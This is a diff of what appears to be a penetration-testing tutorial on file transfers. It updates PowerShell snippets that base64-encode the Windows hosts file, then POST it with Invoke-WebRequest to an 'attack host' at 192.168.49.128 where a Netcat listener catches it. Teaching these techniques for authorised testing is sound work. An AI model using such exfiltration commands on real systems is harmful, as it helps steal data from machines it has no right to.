@@ -128,7 +128,7 @@ We saw how to decode a base64 string using Powershell. Now, let's do the reverse
 
 ## Encode File Using PowerShell
 
-`[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))`
+`[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -AsByteStream -Raw))`
 `Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash`
 
 We copy this content and paste it into our attack host, use the base64 command to decode it, and use the md5sum application to confirm the transfer happened correctly.
@@ -162,7 +162,7 @@ Now we can use a PowerShell script PSUpload.ps1 which uses Invoke-WebRequest to 
 
 Another way to use PowerShell and base64 encoded files for upload operations is by using Invoke-WebRequest or Invoke-RestMethod together with Netcat. We use Netcat to listen in on a port we specify and send the file as a POST request. Finally, we copy the output and use the base64 decode function to convert the base64 string into a file.
 
-`$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))`
+`$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -AsByteStream -Raw))`
 `Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64`
 
 We catch the base64 data with Netcat and use the base64 application with the decode option to convert the string to the file.
